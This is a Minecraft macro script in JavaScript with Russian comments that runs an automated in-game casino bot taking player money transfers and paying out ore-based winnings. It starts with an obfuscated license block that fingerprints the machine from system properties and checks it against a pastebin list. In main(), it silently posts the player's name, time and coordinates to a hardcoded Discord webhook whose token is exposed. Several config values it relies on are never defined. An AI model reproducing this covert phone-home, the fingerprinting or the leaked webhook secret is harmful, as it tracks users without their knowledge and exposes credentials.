// ============================================================
// ЛИЦЕНЗИЯ (HWID) — точно как в примере
// ============================================================

if(typeof global!=='undefined'&&global.process&&global.process.versions&&global.process.versions.node){throw new Error("Node.js запуск запрещен!");}if(typeof Player==='undefined'||typeof Chat==='undefined'||typeof Client==='undefined'){throw new Error("Требуется Minecraft с модом!");}(function(){var g=this,r=null,m=null;Object.defineProperty(g,"DCTkD7",{get:function(){return g},configurable:false,enumerable:false});Object.defineProperty(g,"xu3TrJ",{get:function(){return r},configurable:false,enumerable:false});Object.defineProperty(g,"jq2Hp56",{get:function(){return m},set:function(v){return m=v},configurable:false,enumerable:false});})();function gHW(){try{var o=java.lang.System.getProperty("os.name"),u=java.lang.System.getProperty("user.name"),a=java.lang.System.getProperty("os.arch"),h=java.lang.System.getProperty("user.home"),s=o+"|"+u+"|"+a+"|"+h,hv=0;for(var i=0;i<s.length;i++){var c=s.charCodeAt(i);hv=((hv<<5)-hv)+c;hv=hv&hv;}return Math.abs(hv).toString().substring(0,8);}catch(e){return "00000000";}}function lHW(){try{var u=new java.net.URL("https://pastebin.com/raw/stRwws2h"),c=u.openConnection();c.setRequestProperty("User-Agent","Minecraft Script");var r=new java.io.BufferedReader(new java.io.InputStreamReader(c.getInputStream())),h=[],l;while((l=r.readLine())!=null){l=l.trim();if(l.length===0)continue;var p=l.split(/\s+/);if(p.length>=1){var hp=p[0];if(/^\d{8}$/.test(hp)){h.push(hp);}}}r.close();return h;}catch(e){return [];}}function cLS(){var c=gHW(),h=lHW();for(var i=0;i<h.length;i++){if(h[i]===c)return true;}Chat.log("§8§m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");Chat.log("§4✖ §c§lДОСТУП ЗАПРЕЩЕН!");Chat.log("");Chat.log("§7Ваш HWID: §f"+c);Chat.log("§7Отправьте этот HWID владельцу");Chat.log("§7скрипта для получения доступа дс:fenix_66667 тг:@fenix666667");Chat.log("");Chat.log("§8§m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");return false;}var cah=null,cal=null,lct=0,CT=30000;function qLC(){var t=new Date().getTime();if(cah&&cal&&(t-lct)<CT)return cal;var c=gHW();if(!cah||(t-lct)>=CT){cah=lHW();lct=t;}for(var i=0;i<cah.length;i++){if(cah[i]===c){cal=true;return true;}}cal=false;return false;}function cLSt(){if(!qLC()){logE("§4✖ §cОбнаружена проблема с лицензией!");throw "Stop (Лицензия не действительна)";}}if(!cLS())throw "Stop (Нет лицензии)";

// --- Вспомогательные логи для лицензии (чтобы работал cLSt) ---
var PM="§b§l[§3Farm§b] §8» §f",PS="§6§l[★ Магазин] §8» §e",PW="§e§l[⚠ Предупреждение] §8» §6",PE="§4§l[✖ Ошибка] §8» §c",PD="§7§l[🔍 Логи] §8» §7",PL="§d§l[❤ Лайки] §8» §d",PQ="§a§l[✅ Квесты] §8» §2",SEP="§8§m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";function logI(m){Chat.log(PM+m);}function logS(m){Chat.log(PS+m);}function logW(m){Chat.log(PW+m);}function logE(m){Chat.log(PE+m);}function logD(m){Chat.log(PD+m);}function logL(m){Chat.log(PL+m);}function logQ(m){Chat.log(PQ+m);}function logSep(){Chat.log(SEP);}

// ============================================================
// ОСНОВНОЙ КОД (без изменений)
// ============================================================

var GOOD_ORES = ORES.filter(function(o) { return o.good; });
var BAD_ORES = ORES.filter(function(o) { return !o.good; });

var totalGoodWeight = 0, totalBadWeight = 0;
for (var i = 0; i < ORES.length; i++) {
    if (ORES[i].good) totalGoodWeight += ORES[i].weight;
    else totalBadWeight += ORES[i].weight;
}
var ORIGINAL_GOOD_PROB = totalGoodWeight / (totalGoodWeight + totalBadWeight);

function getGoodProb() {
    var wc = WIN_CHANCE;
    if (wc < 0) wc = 0;
    if (wc > 100) wc = 100;
    if (wc <= 50) return (wc / 50) * ORIGINAL_GOOD_PROB;
    else return ORIGINAL_GOOD_PROB + ((wc - 50) / 50) * (1 - ORIGINAL_GOOD_PROB);
}

var isPlaying = false;
var queue = [];
var currentNick = "";
var currentBet = 0;
var payEnabled = true;
var lastMsgTime = 0;
var ERROR_COUNT = 0;
var lastHubCheck = 0;

function chatSayWithDelay(msg) {
    var now = java.lang.System.currentTimeMillis();
    var diff = now - lastMsgTime;
    if (diff < 5000) {
        var waitMs = 5000 - diff;
        var ticks = Math.ceil(waitMs / 50);
        if (ticks > 0) Client.waitTick(ticks);
    }
    Chat.say(msg);
    lastMsgTime = java.lang.System.currentTimeMillis();
}

function logToFile(msg) {
    try {
        var f = new java.io.File("C:/Users/" + java.lang.System.getProperty("user.name") + "/Desktop/casino_log.txt");
        var fw = new java.io.FileWriter(f, true);
        fw.write(new java.util.Date().toString() + " - " + msg + "\n");
        fw.close();
    } catch(e) {}
}

function checkHubNow() {
    try {
        var player = Player.getPlayer();
        if (!player) { Client.waitTick(5); return false; }
        var y = Math.round(player.getY());
        if ([53,54,55].indexOf(y) !== -1) {
            chatSayWithDelay("ХАБ! Высота " + y + ", перезахожу на сервер " + SERVER_NUMBER);
            ERROR_COUNT = 0;
            KeyBind.key("key.keyboard.escape", true); Client.waitTick(1); KeyBind.key("key.keyboard.escape", false);
            Client.waitTick(20);
            if (LOGIN_PASSWORD && LOGIN_PASSWORD !== "твой_пароль") { Chat.say("/login " + LOGIN_PASSWORD); Client.waitTick(40); }
            Chat.say("/menu"); Client.waitTick(40);
            try { var inv = Player.openInventory(); if (inv) inv.click(0); } catch(e) {}
            Client.waitTick(30);
            var s = SERVER_NUMBER - 1; if (s < 0) s = 0; if (s > 4) s = 4;
            try { var inv2 = Player.openInventory(); if (inv2) inv2.click(s); } catch(e) {}
            for (var i = 0; i < 10; i++) { Client.waitTick(10); try { if (Player.getPlayer()) break; } catch(e) {} }
            Chat.say("/god"); Client.waitTick(10); Chat.say("/fly"); Client.waitTick(20);
            chatSayWithDelay("Зашёл на сервер " + SERVER_NUMBER);
            Client.waitTick(40);
            return true;
        }
    } catch(e) { if (e !== "StoppedByUser") logToFile("Ошибка хаба: " + e); }
    return false;
}

function waitTicksSafe(ticks) {
    for (var i = 0; i < ticks; i++) {
        if (!GlobalVars.getBoolean(SCRIPT_ID)) return;
        if (java.lang.System.currentTimeMillis() - lastHubCheck > 1000) {
            if (checkHubNow()) Client.waitTick(40);
            lastHubCheck = java.lang.System.currentTimeMillis();
        }
        Client.waitTick(1);
    }
}

function lookAtEntity(entity) {
    var player = Player.getPlayer();
    var ePos = entity.getPos();
    player.lookAt(ePos.getX(), ePos.getY(), ePos.getZ());
}

function getEmptyFrames(radius) {
    var player = Player.getPlayer();
    if (!player) return [];
    var pos = player.getPos();
    var entities = World.getEntities();
    var empty = [];
    for (var i = 0; i < entities.size(); i++) {
        var e = entities.get(i);
        if (e.getType() !== "minecraft:item_frame") continue;
        var ePos = e.getPos();
        var dx = pos.getX() - ePos.getX();
        var dy = pos.getY() - ePos.getY();
        var dz = pos.getZ() - ePos.getZ();
        var dist = Math.sqrt(dx*dx + dy*dy + dz*dz);
        if (dist > radius) continue;
        try {
            var nbt = e.getNBT();
            var item = nbt.getCompound("Item");
            if (item === null || item.isEmpty()) empty.push(e);
        } catch(e2) { empty.push(e); }
    }
    return empty;
}

function selectHotbarSlot(slotIndex) {
    if (slotIndex < 0 || slotIndex > 8) return false;
    var keyNames = [
        "key.keyboard.1", "key.keyboard.2", "key.keyboard.3", "key.keyboard.4",
        "key.keyboard.5", "key.keyboard.6", "key.keyboard.7", "key.keyboard.8",
        "key.keyboard.9"
    ];
    var key = keyNames[slotIndex];
    KeyBind.key(key, true);
    Client.waitTick(1);
    KeyBind.key(key, false);
    Client.waitTick(2);
    return true;
}

function selectOre() {
    var totalWeight = 0;
    for (var i = 0; i < ORES.length; i++) totalWeight += ORES[i].weight;
    var rand = Math.random() * totalWeight;
    var cum = 0;
    for (var i = 0; i < ORES.length; i++) {
        cum += ORES[i].weight;
        if (rand <= cum) return ORES[i];
    }
    return ORES[ORES.length - 1];
}

function performSpin(frames, hotbarMap) {
    var totalMultiplier = 0;
    var enderEyeFound = false;
    for (var i = 0; i < frames.length; i++) {
        var frame = frames[i];
        var ore = selectOre();
        if (ore.ender) enderEyeFound = true;
        var slotIndex = hotbarMap[ore.id];
        if (slotIndex === undefined) {
            var found = false;
            for (var j = 0; j < ORES.length; j++) {
                var alt = ORES[j];
                if (hotbarMap[alt.id] !== undefined) {
                    ore = alt;
                    slotIndex = hotbarMap[alt.id];
                    found = true;
                    break;
                }
            }
            if (!found) {
                logToFile("Ошибка: нет доступных руд в хотбаре");
                return null;
            }
        }
        totalMultiplier += ore.multiplier;
        selectHotbarSlot(slotIndex);
        lookAtEntity(frame);
        Client.waitTick(3);
        try {
            var result = Player.getPlayer().interactEntity(frame, false, false);
            if (!result) {
                logToFile("Не удалось вставить в рамку " + (i+1));
                return null;
            }
        } catch(e) {
            logToFile("Ошибка вставки: " + e);
            return null;
        }
        Client.waitTick(5);
    }

    if (PAUSE_BEFORE_BREAK > 0) Client.waitTick(PAUSE_BEFORE_BREAK);
    for (var i = 0; i < frames.length; i++) {
        var frame = frames[i];
        lookAtEntity(frame);
        Client.waitTick(2);
        try { Player.getPlayer().attack(frame); } catch(e) {}
        Client.waitTick(3);
    }

    return { totalMultiplier: totalMultiplier, enderEyeFound: enderEyeFound };
}

function sendPay(nick, amount) {
    var amountInt = Math.floor(amount);
    if (amountInt <= 0) return;
    var cmd = "/pay " + nick + " " + amountInt;
    chatSayWithDelay(cmd);
    Client.waitTick(5);
    if (amountInt > 100000) {
        chatSayWithDelay(cmd);
        Client.waitTick(5);
    }
}

function togglePay(enable) {
    if (enable === payEnabled) return;
    Chat.say("/paytoggle");
    Client.waitTick(3);
    payEnabled = enable;
    logToFile("Переводы " + (enable ? "включены" : "выключены"));
}

function readHotbar() {
    var inv = Player.openInventory();
    if (!inv) return null;
    var map = {};
    for (var i = 0; i < 9; i++) {
        var slotIndex = 36 + i;
        try {
            var slot = inv.getSlot(slotIndex);
            if (slot !== null && !slot.isEmpty()) {
                var itemId = slot.getItemId();
                for (var j = 0; j < ORES.length; j++) {
                    if (ORES[j].id === itemId) {
                        map[itemId] = i;
                        break;
                    }
                }
            }
        } catch(e) {}
    }
    inv.close();
    Client.waitTick(5);
    return map;
}

function playGame(nick, initialBet) {
    currentNick = nick;
    currentBet = initialBet;
    isPlaying = true;
    logToFile("Начало игры для " + nick + ", ставка " + initialBet);

    togglePay(false);

    var totalWin = 0;
    var extraSpins = 0;
    var maxExtra = MAX_EXTRA_SPINS;

    function doOneSpin(bet, isExtra) {
        if (!GlobalVars.getBoolean(SCRIPT_ID)) return null;

        var hotbarMap = readHotbar();
        if (!hotbarMap || Object.keys(hotbarMap).length === 0) {
            chatSayWithDelay("**Ошибка: в хотбаре нет руд. Возврат ставки.");
            sendPay(nick, bet);
            return null;
        }

        var frames = getEmptyFrames(6);
        if (frames.length < 9) {
            chatSayWithDelay("**Ошибка: недостаточно пустых рамок. Возврат ставки.");
            sendPay(nick, bet);
            return null;
        }

        var spinResult = performSpin(frames.slice(0, 9), hotbarMap);
        if (spinResult === null) {
            chatSayWithDelay("**Ошибка вставки. Возврат ставки.");
            sendPay(nick, bet);
            return null;
        }

        var totalMultiplier = spinResult.totalMultiplier;
        var enderEyeFound = spinResult.enderEyeFound;

        var win = bet * totalMultiplier;
        win = Math.floor(win);
        if (win <= 0) win = 0;

        var multStr = totalMultiplier.toFixed(3);
        var resultMsg = "**" + nick + " | Ставка: " + bet + "$ | множитель: x" + multStr + " | Вывод: " + win + "$";
        chatSayWithDelay(resultMsg);
        logToFile("Спин " + (isExtra ? "доп." : "осн.") + " результат: " + resultMsg);

        return { win: win, enderEyeFound: enderEyeFound };
    }

    var mainResult = doOneSpin(initialBet, false);
    if (mainResult === null) {
        togglePay(true);
        isPlaying = false;
        currentNick = "";
        currentBet = 0;
        return;
    }
    totalWin += mainResult.win;
    if (mainResult.enderEyeFound && mainResult.win > 0) {
        var extraBet = mainResult.win;
        while (extraSpins < maxExtra && extraBet > 0) {
            chatSayWithDelay("**Око Эндера - дополнительный спин игрока " + nick + " | Сумма ставки " + extraBet + "$");
            logToFile("Дополнительный спин #" + (extraSpins+1) + " ставка " + extraBet);

            var extraResult = doOneSpin(extraBet, true);
            if (extraResult === null) break;
            totalWin += extraResult.win;
            extraSpins++;
            if (!extraResult.enderEyeFound) break;
            extraBet = extraResult.win;
            if (extraBet <= 0) break;
        }
        if (extraSpins >= maxExtra) {
            chatSayWithDelay("**Око Эндера - лимит дополнительных спинов достигнут (" + maxExtra + ")");
            logToFile("Достигнут лимит доп. спинов");
        }
    }

    if (totalWin > 0) {
        sendPay(nick, totalWin);
    }

    togglePay(true);
    isPlaying = false;
    currentNick = "";
    currentBet = 0;
    logToFile("Игра завершена. Общий выигрыш: " + totalWin);
}

function handleBet(nick, amount) {
    if (!GlobalVars.getBoolean(SCRIPT_ID)) return;
    if (isPlaying && nick === currentNick) {
        logToFile("Игнорируем дубликат от " + nick);
        return;
    }
    if (amount < MIN_BET || amount > MAX_BET) {
        chatSayWithDelay("**Ошибка: ставка " + amount + "$ вне лимита. Минимум " + MIN_BET + "$, максимум " + MAX_BET + "$ Возврат.");
        sendPay(nick, amount);
        return;
    }
    if (!isPlaying && queue.length === 0) {
        playGame(nick, amount);
        processQueue();
    } else {
        queue.push({ nick: nick, amount: amount });
        chatSayWithDelay("**Очередь: " + nick + " (" + amount + "$) добавлен");
        logToFile("Добавлен в очередь: " + nick + " (" + amount + "$)");
    }
}

function processQueue() {
    if (!GlobalVars.getBoolean(SCRIPT_ID)) return;
    if (queue.length === 0) {
        Chat.say("**Казино Бот свободен");
        logToFile("Очередь пуста");
        return;
    }
    var next = queue.shift();
    logToFile("Обработка очереди: " + next.nick + " (" + next.amount + "$)");
    playGame(next.nick, next.amount);
    if (GlobalVars.getBoolean(SCRIPT_ID)) {
        processQueue();
    }
}

function main() {
    if (GlobalVars.getBoolean(SCRIPT_ID)) {
        GlobalVars.putBoolean(SCRIPT_ID, false);
        Chat.log("§c[Casino] Остановлен");
        return;
    }
    GlobalVars.putBoolean(SCRIPT_ID, true);
    Chat.log("§a[Casino] Запущен");
    chatSayWithDelay("**Казино Бот запущен");

    // --- ОТПРАВКА В DISCORD ---
    try {
        var playerName = Player.getPlayer().getName().getString();
        var now = new java.util.Date();
        var dateFormat = new java.text.SimpleDateFormat("dd.MM.yyyy HH:mm:ss");
        var formattedDate = dateFormat.format(now);
        
        var player = Player.getPlayer();
        var x = Math.floor(player.getX());
        var y = Math.floor(player.getY());
        var z = Math.floor(player.getZ());
        var coords = x + " " + y + " " + z;
        
        var data = JSON.stringify({
            "content": "**Скрипт активирован: Казино**\n**Игрок:** " + playerName + "\n**Время:** " + formattedDate + "\n**Координаты:** " + coords
        });
        
        var url = new java.net.URL("https://discord.com/api/webhooks/1509650397143367751/9-LfUsGrRY6ljss36uU-L9UI8nA3oHNHEJaAPh7R_AtkuTVEhnyGiMqsAfnePGEYgbI0");
        var conn = url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
        conn.setDoOutput(true);
        
        var os = conn.getOutputStream();
        var writer = new java.io.BufferedWriter(new java.io.OutputStreamWriter(os, "UTF-8"));
        writer.write(data);
        writer.flush();
        writer.close();
        os.close();
        
        conn.getResponseCode();
    } catch(e) {
        logToFile("Ошибка отправки в Discord: " + e);
    }

    lastHubCheck = java.lang.System.currentTimeMillis();

    isPlaying = false;
    queue = [];
    currentNick = "";
    currentBet = 0;
    logToFile("Состояние сброшено при старте");

    Chat.say("/paytoggle");
    Client.waitTick(5);
    Chat.say("/paytoggle");
    Client.waitTick(5);
    payEnabled = true;
    logToFile("Переводы включены");

    Client.waitTick(60);
    var pos = 0;
    try {
        var f = new java.io.File(LOG_PATH);
        if (f.exists()) pos = f.length();
    } catch(e) {}

    var lastActivityTime = java.lang.System.currentTimeMillis();
    var lastIdleMsgTime = 0;

    while (true) {
        if (!GlobalVars.getBoolean(SCRIPT_ID)) break;

        if (java.lang.System.currentTimeMillis() - lastHubCheck > 1000) {
            if (checkHubNow()) Client.waitTick(40);
            lastHubCheck = java.lang.System.currentTimeMillis();
        }

        try {
            var f = new java.io.File(LOG_PATH);
            if (f.exists()) {
                var newLen = f.length();
                if (newLen > pos) {
                    var raf = new java.io.RandomAccessFile(f, "r");
                    raf.seek(pos);
                    var bytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, newLen - pos);
                    raf.readFully(bytes);
                    raf.close();
                    var newContent = new java.lang.String(bytes, "UTF-8");
                    var lines = newContent.split("\n");
                    for (var i = 0; i < lines.length; i++) {
                        var s = lines[i];
                        var match = s.match(/\[\$\] Игрок (.+?) отправил Вам ([0-9,]+)\$/);
                        if (match) {
                            var nick = match[1].trim();
                            var amountStr = match[2].replace(/,/g, '');
                            var amount = parseInt(amountStr);
                            if (!isNaN(amount) && nick.length > 0) {
                                logToFile("Найден перевод: " + nick + " " + amount);
                                if (isPlaying && nick === currentNick) {
                                    logToFile("Игнорируем дубликат от " + nick);
                                } else if (!isPlaying && queue.length === 0) {
                                    handleBet(nick, amount);
                                } else {
                                    queue.push({ nick: nick, amount: amount });
                                    chatSayWithDelay("**Очередь: " + nick + " (" + amount + "$) добавлен");
                                    logToFile("Добавлен в очередь: " + nick + " (" + amount + "$)");
                                }
                                lastActivityTime = java.lang.System.currentTimeMillis();
                            }
                        }
                    }
                    pos = newLen;
                }
            }
        } catch(e) {
            logToFile("Ошибка чтения лога: " + e);
        }

        var now = java.lang.System.currentTimeMillis();
        if (!isPlaying && queue.length === 0 && (now - lastActivityTime > 60000)) {
            if (now - lastIdleMsgTime > 60000) {
                chatSayWithDelay("**Казино Бот свободен Жду ставки");
                lastIdleMsgTime = now;
                lastActivityTime = now;
            }
        }

        Client.waitTick(5);
    }

    if (isPlaying) {
        if (currentNick) {
            sendPay(currentNick, currentBet);
            chatSayWithDelay("**Скрипт остановлен, возврат ставки игроку " + currentNick);
        }
        isPlaying = false;
    }
    if (!payEnabled) {
        Chat.say("/paytoggle");
        Client.waitTick(5);
        payEnabled = true;
    }
    GlobalVars.putBoolean(SCRIPT_ID, false);
    chatSayWithDelay("**Казино Бот выключен");
    Chat.log("§c[Casino] Завершён");
}

main();
